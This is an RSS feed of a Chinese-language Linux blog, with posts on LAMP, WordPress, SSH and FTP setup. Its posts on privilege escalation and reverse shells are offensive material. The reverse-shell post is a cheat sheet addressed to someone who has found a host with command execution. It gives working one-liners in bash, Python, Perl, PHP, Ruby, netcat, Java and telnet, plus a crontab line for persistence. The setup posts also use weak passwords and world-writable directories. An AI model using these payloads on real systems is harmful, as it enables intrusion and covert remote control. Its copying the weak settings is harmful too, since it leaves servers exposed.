<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Linux on </title>
    <link>http://wyb0.com/tags/linux/</link>
    <description>Recent content in Linux on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Fri, 12 Aug 2016 08:39:35 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/tags/linux/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Linux下虚拟主机搭建多站点</title>
      <link>http://wyb0.com/posts/Linux%E4%B8%8B%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E6%90%AD%E5%BB%BA%E5%A4%9A%E7%AB%99%E7%82%B9/</link>
      <pubDate>Fri, 12 Aug 2016 08:39:35 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Linux%E4%B8%8B%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E6%90%AD%E5%BB%BA%E5%A4%9A%E7%AB%99%E7%82%B9/</guid>
      <description>

&lt;p&gt;环境：CentOS-6.5-x86_64-minimal&lt;/p&gt;

&lt;h3 id=&#34;0x00-搭建lamp:9a5e185975b471e9e09c3f973133f164&#34;&gt;0x00 搭建LAMP&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;安装Apache&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;yum install httpd
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;安装MySQL&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;yum install mysql mysql-server&lt;/li&gt;

&lt;li&gt;&lt;p&gt;设置数据库&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[reber@localhost conf]$ sudo mysql_secure_installation
# 更新root密码：
[reber@localhost conf]$ mysql -uroot –p
mysql&amp;gt; use mysql;
mysql&amp;gt; update user set password=password(&#39;123456&#39;) where user=&#39;root&#39;;
mysql&amp;gt; flush privileges;  //不想重启mysql就使新密码生效就需要运行此命令刷新
mysql&amp;gt; insert into mysql.user(Host,User,Password) values(&amp;quot;localhost&amp;quot;,&amp;quot;blog&amp;quot;,password(&amp;quot;123456&amp;quot;));
# mysql&amp;gt; detele form mysql.user where User=&#39;blog&#39; and Host=&#39;localhost&#39;;  //这步可以删除用户
mysql&amp;gt; flush privileges;  //刷新
mysql&amp;gt; create database db_blog;
Query OK, 1 row affected (0.00 sec)
# 授权用户&amp;quot;blog&amp;quot;拥有db_blog数据库的所有权限
mysql&amp;gt; grant all privileges on db_blog.* to blog@localhost identified by &#39;666666&#39;;
mysql&amp;gt; flush privileges;  //刷新
[reber@localhost conf]$ mysql –ublog –p  //此时就需要用666666登陆数据库db_blog
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;安装PHP&lt;br /&gt;
yum install php php-mysql php-gd php-imap php-ldap php-mbstring php-odbc php-pear php-xml php-xmlrpc&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;验证AMP搭建成功&lt;br /&gt;
[reber@localhost html]$ echo &amp;ldquo;&amp;lt;?php phpinfo();?&amp;gt;&amp;rdquo; &amp;gt;&amp;gt; index.php

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/linux_virtual_host_test.png&#34; alt=&#34;测试lamp环境&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x01-设置虚拟主机:9a5e185975b471e9e09c3f973133f164&#34;&gt;0x01 设置虚拟主机&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;[reber@localhost html]$ sudo vim /etc/httpd/conf/httpd.conf

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/linux_virtual_host_set_port.png&#34; alt=&#34;设置端口&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/linux_virtual_host_set_virtualhost.png&#34; alt=&#34;设置虚拟主机&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/linux_virtual_host_add_file.png&#34; alt=&#34;设置虚拟主机&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-修改本地windows的hosts文件-进行测试:9a5e185975b471e9e09c3f973133f164&#34;&gt;0x02 修改本地windows的hosts文件，进行测试&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/linux_virtual_host_change_hosts.png&#34; alt=&#34;设置虚拟主机&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/linux_virtual_host_visit_site.png&#34; alt=&#34;测试虚拟主机&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-搭建wordpress:9a5e185975b471e9e09c3f973133f164&#34;&gt;0x03 搭建WordPress&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;下载WordPress并设置&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ cd /var/www/blog
$ sudo wget https://cn.wordpress.org/wordpress-4.5-zh_CN.tar.gz
$ tar -zxvf wordpress-4.5-zh_CN.tar.gz
$ chown –R  apache:apache  wordpress-4.5
$ mv /var/www/blog/wordpress-4.5/* ../
$ rm -rf wordpress-4.5
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;安装WordPress&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/linux_virtual_host_install_wordpress1.png&#34; alt=&#34;安装WordPress1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/linux_virtual_host_install_wordpress2.png&#34; alt=&#34;安装WordPress2&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x04-登陆后台写博客:9a5e185975b471e9e09c3f973133f164&#34;&gt;0x04 登陆后台写博客&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/linux_virtual_host_login_background.png&#34; alt=&#34;后台登陆&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/linux_virtual_host_add_article.png&#34; alt=&#34;添加文章&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Linux下SSH连接</title>
      <link>http://wyb0.com/posts/Linux%E4%B8%8BSSH%E8%BF%9E%E6%8E%A5/</link>
      <pubDate>Wed, 10 Aug 2016 11:46:13 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Linux%E4%B8%8BSSH%E8%BF%9E%E6%8E%A5/</guid>
      <description>

&lt;h3 id=&#34;0x00-ssh相关选项:e269c2bc9ccc66fa2c170f02752c5233&#34;&gt;0x00 SSH相关选项&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;-V 显示版本
-f 输入密码后进入后台模式
-N 不执行远程命令，用于端口转发
-D socket5代理
-L tcp转发
-C 使用数据压缩，网速快时会影响速度
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-ssh免密码登陆:e269c2bc9ccc66fa2c170f02752c5233&#34;&gt;0x01 SSH免密码登陆&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;A主机免密码登陆B主机：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;A主机运行：
    ssh-keygen -t rsa
    会生成两个文件~/.ssh/id_rsa和~/.ssh/id_rsa.pub
    将id_rsa.pub中的内容复制到B主机的~/.ssh/authorized_keys中
注：
    要确保B主机~/.ssh/authorized_keys权限为600
    要确保B主机~/.ssh/文件夹权限为700
    要确保上述两个文件属主是当前用户
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ssh_no_pwd_login_create_keys.png&#34; alt=&#34;A主机生成密钥对.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ssh_no_pwd_login_write_pub_key_to_b.png&#34; alt=&#34;将A主机产生的公钥写入B主机.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ssh_no_pwd_login_check_authorized_keys_permissions.png&#34; alt=&#34;检查B主机authorized_keys权限.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ssh_no_pwd_login_a_login_b.png&#34; alt=&#34;A主机免密码登陆主机B.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-ssh反向连接:e269c2bc9ccc66fa2c170f02752c5233&#34;&gt;0x02 SSH反向连接&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;主机A要通过SSH连接主机B：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;B上先运行：
ssh -NfR 8888:localhost:22 reber@A-IP
输入主机A的用户reber的密码后即可在A主机监听一个8888端口，它与主机B的22端口绑定
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ssh_reverse_conn_b_run_command.png&#34; alt=&#34;主机B反向连接主机A.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;A主机运行：
ssh root@127.0.0.1 -p 8888
输入本机的root的密码即可登入主机B的root用户
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ssh_reverse_conn_a_run_command.png&#34; alt=&#34;主机A连接主机B.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-ssh-socks5代理:e269c2bc9ccc66fa2c170f02752c5233&#34;&gt;0x03 SSH Socks5代理&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ssh_socks5_proxy_set.png&#34; alt=&#34;设置ssh socks5.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ssh_socks5_proxy_set_firefox.png&#34; alt=&#34;设置ssh socks5.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ssh_socks5_proxy_firefox_internet.png&#34; alt=&#34;火狐通过代理可以上网.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Linux下系统漏洞提权</title>
      <link>http://wyb0.com/posts/Linux%E4%B8%8B%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/</link>
      <pubDate>Tue, 09 Aug 2016 19:23:13 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Linux%E4%B8%8B%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/</guid>
      <description>

&lt;h3 id=&#34;0x00-linux下的提权:9e405ba2c6babe10b05fb17989641b6b&#34;&gt;0x00 Linux下的提权&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Linux下一般都是系统漏洞提权，分为以下几个步骤：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1. 获取系统版本号
2. 根据系统版本号找对应exp
3. 反弹shell
4. 尝试利用
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-提权:9e405ba2c6babe10b05fb17989641b6b&#34;&gt;0x01 提权&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;获取系统版本号

&lt;ul&gt;
&lt;li&gt;获取发行版本

&lt;ul&gt;
&lt;li&gt;cat /etc/*-release&lt;/li&gt;
&lt;li&gt;cat /etc/issue&lt;/li&gt;
&lt;li&gt;cat /etc/lsb-release&lt;/li&gt;
&lt;li&gt;cat /etc/redhat-release&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;获取内核版本

&lt;ul&gt;
&lt;li&gt;cat /proc/version&lt;/li&gt;
&lt;li&gt;uname -a&lt;/li&gt;
&lt;li&gt;uname -mrs&lt;/li&gt;
&lt;li&gt;rpm -q kernel&lt;/li&gt;
&lt;li&gt;dmesg | grep Linux&lt;/li&gt;
&lt;li&gt;ls /boot | grep vmlinuz&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;根据系统版本号找对应exp

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.exploit-db.com&#34;&gt;http://www.exploit-db.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://1337day.com&#34;&gt;http://1337day.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.securiteam.com&#34;&gt;http://www.securiteam.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.securityfocus.com&#34;&gt;http://www.securityfocus.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.exploitsearch.net&#34;&gt;http://www.exploitsearch.net&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://metasploit.com/modules&#34;&gt;http://metasploit.com/modules&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://securityreason.com&#34;&gt;http://securityreason.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://seclists.org/fulldisclosure&#34;&gt;http://seclists.org/fulldisclosure&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.google.com&#34;&gt;http://www.google.com&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;反弹shell

&lt;ul&gt;
&lt;li&gt;本地：&lt;code&gt;nc -l -p 8888&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;目标机器：&lt;code&gt;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/8888 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;尝试利用&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x02-实例:9e405ba2c6babe10b05fb17989641b6b&#34;&gt;0x02 实例&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;得到系统版本号

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_get_sys_version.png&#34; alt=&#34;得到系统版本号.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;找对应exp

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_search_exp.png&#34; alt=&#34;找相应exp.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_exp_code.png&#34; alt=&#34;保存exp源码.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;反弹shell

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_webshell_rebound_shell.png&#34; alt=&#34;反弹shell.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;提权

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_write_exp_code.png&#34; alt=&#34;下载exp源码.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_compile_exp_code.png&#34; alt=&#34;编译exp源码.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_run_exp.png&#34; alt=&#34;运行exp.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Linux下反弹shell</title>
      <link>http://wyb0.com/posts/Linux%E4%B8%8B%E5%8F%8D%E5%BC%B9shell/</link>
      <pubDate>Sat, 06 Aug 2016 08:36:53 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Linux%E4%B8%8B%E5%8F%8D%E5%BC%B9shell/</guid>
      <description>

&lt;p&gt;当你找到一个有命令执行的主机时，你可能想要一个交互式deshell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令&lt;/p&gt;

&lt;h3 id=&#34;0x00-bash:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x00 Bash&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/8888 0&amp;gt;&amp;amp;1
注：这个由解析shell的bash完成，有些时候不支持
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x01-crontab:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x01 crontab&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;下面这条命令执行后会每隔30分钟反弹一次：
(crontab -l;printf &amp;quot;*/30 * * * * exec 9&amp;lt;&amp;gt; /dev/tcp/10.10.10.10/8888;exec 0&amp;lt;&amp;amp;9;
exec 1&amp;gt;&amp;amp;9 2&amp;gt;&amp;amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&amp;quot;)|
crontab -
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x02-python:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x02 Python&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# 下面为1条命令
python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,
socket.SOCK_STREAM);s.connect((&amp;quot;10.10.10.10&amp;quot;,8888));os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x03-perl:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x03 Perl&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;# 下面为1条命令
perl -e &#39;use Socket;$i=&amp;quot;10.10.10.10&amp;quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,
getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,
&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);};&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x04-php:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x04 PHP&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;php -r &#39;$sock=fsockopen(&amp;quot;10.10.10.10&amp;quot;,8888);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x05-ruby:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x05 Ruby&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;# 下面为1条命令
ruby -rsocket -e&#39;f=TCPSocket.open(&amp;quot;10.10.10.10&amp;quot;,8888).to_i;
exec sprintf(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;quot;,f,f,f)&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x06-netcat:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x06 Netcat&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;nc -e /bin/sh 10.10.10.10 8888
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x07-java:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x07 Java&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;# 下面为3条命令
r = Runtime.getRuntime()
p = r.exec([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;exec 5&amp;lt;&amp;gt;/dev/tcp/10.10.10.10/8888;cat &amp;lt;&amp;amp;5 | 
while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;quot;] as String[])
p.waitFor()
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x08-telnet:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x08 telnet&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;两种方法：
mknod backpipe p &amp;amp;&amp;amp; telnet 173.214.173.151 8080 0backpipe
telnet 173.214.173.151 8080 | /bin/bash | telnet 173.214.173.151 8888
第一种hacker运行：nc -vlp 8080
第二种hacker运行：nc -vlp 8080和nc -vlp 8888
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
参考文章：&lt;br /&gt;
&lt;a href=&#34;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&#34;&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;https://www.91ri.org/6620.html&#34;&gt;https://www.91ri.org/6620.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Linux下搭建FTP</title>
      <link>http://wyb0.com/posts/Linux%E4%B8%8B%E6%90%AD%E5%BB%BAFTP/</link>
      <pubDate>Sat, 18 Jun 2016 09:40:06 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Linux%E4%B8%8B%E6%90%AD%E5%BB%BAFTP/</guid>
      <description>

&lt;pre&gt;&lt;code&gt;安装环境为：CentOS-6.5-x86_64-minimal
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;安装:0321999c3409190821365412ef440ce9&#34;&gt;安装&lt;/h2&gt;

&lt;p&gt;yum install vsftpd&lt;/p&gt;

&lt;h2 id=&#34;配置:0321999c3409190821365412ef440ce9&#34;&gt;配置&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;备份&lt;br /&gt;
cp /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf.bak&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;编辑配置文件&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;vim /etc/vsftpd/vsftpd.conf
anonymous_enable=NO #设定不允许匿名访问
local_enable=YES    #设定本地用户可以访问
chroot_list_enable=YES  #使用户不能离开主目录
xferlog_file=/var/log/vsftpd.log    #设定vsftpd的服务日志
ascii_upload_enable=YES
ascii_download_enable=YES   #设定支持ASCII
pam_service_name=vsftpd #PAM认证文件名,PAM将根据/etc/pam.d/vsftpd进行认证
# 并在尾部追加：
guest_enable=YES    #设定启用虚拟用户功能。
guest_username=ftp  #指定虚拟用户的宿主用户。-CentOS中已经有内置的ftp用户了
guest_config_dir=/etc/vsftpd/vuser_conf #设定虚拟用户个人vsftp的配置文件存放路径。存放虚拟用户个性化的配置文件名，和虚拟用户名相同
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;新增chroot_list并将ftp用户输入进去&lt;br /&gt;
touch /etc/vsftpd/chroot_list&lt;br /&gt;
echo ftp &amp;gt;&amp;gt; /etc/vsftpd/chroot_list&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;安装Berkeley DB工具用来对虚拟用户认证配置管理：&lt;br /&gt;
yum install db4 db4-utils&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;创建用户账户文件&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vim /etc/vsftpd/vuser_passwd.txt
user1   #奇数行是用户名
123456  #偶数行是密码
user2   #奇数行是用户名
666666  #偶数行是密码
user3   #奇数行是用户名
user3   #偶数行是密码
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;用Berkeley DB工具生成认证文件&lt;br /&gt;
db_load -T -t hash -f /etc/vsftpd/vuser_passwd.txt   /etc/vsftpd/vuser_passwd.db&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;编辑/etc/pam.d/vsftpd，注释掉所有原来内容，添加如下内容：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;auth required pam_userdb.so db=/etc/vsftpd/vuser_passwd
account required pam_userdb.so db=/etc/vsftpd/vuser_passwd
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;针对每个用户增加个性化配置文件:0321999c3409190821365412ef440ce9&#34;&gt;针对每个用户增加个性化配置文件&lt;/h2&gt;

&lt;p&gt;配置后user1登陆后所在目录就是/var/ftphome了，而user2、user3登陆后还是在默认的/var/ftp/&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mkdir /etc/vsftpd/vuser_conf/
vim /etc/vsftpd/vuser_conf/user1
local_root=/var/ftphome/   #此目录位置可以修改
write_enable=YES #可写
anon_umask=022 #掩码
anon_world_readable_only=NO
anon_upload_enable=YES
anon_mkdir_write_enable=YES
anon_other_write_enable=YES
创建目录并修改权限：
mkdir /var/ftphome
chmod 777 /var/ftphome
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;启动服务:0321999c3409190821365412ef440ce9&#34;&gt;启动服务&lt;/h2&gt;

&lt;p&gt;service vsftpd start&lt;br /&gt;
此时就可以用用户名登陆ftp了(只能终端登录)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Linux下搭建Tomcat&#43;MySQL&#43;JSP</title>
      <link>http://wyb0.com/posts/Linux%E4%B8%8B%E6%90%AD%E5%BB%BATomcat&#43;MySQL&#43;JSP/</link>
      <pubDate>Fri, 17 Jun 2016 23:08:05 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Linux%E4%B8%8B%E6%90%AD%E5%BB%BATomcat&#43;MySQL&#43;JSP/</guid>
      <description>

&lt;pre&gt;&lt;code&gt;安装环境为：CentOS-6.5-x86_64-minimal
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;安装mysql:fbf0d4a2271391a40d84f5a22404d870&#34;&gt;安装mysql&lt;/h2&gt;

&lt;p&gt;sudo yum install mysql mysql-server mysql-devel&lt;/p&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/install_mysql.png&#34; alt=&#34;安装mysql.png&#34;&gt;
&lt;/div&gt;
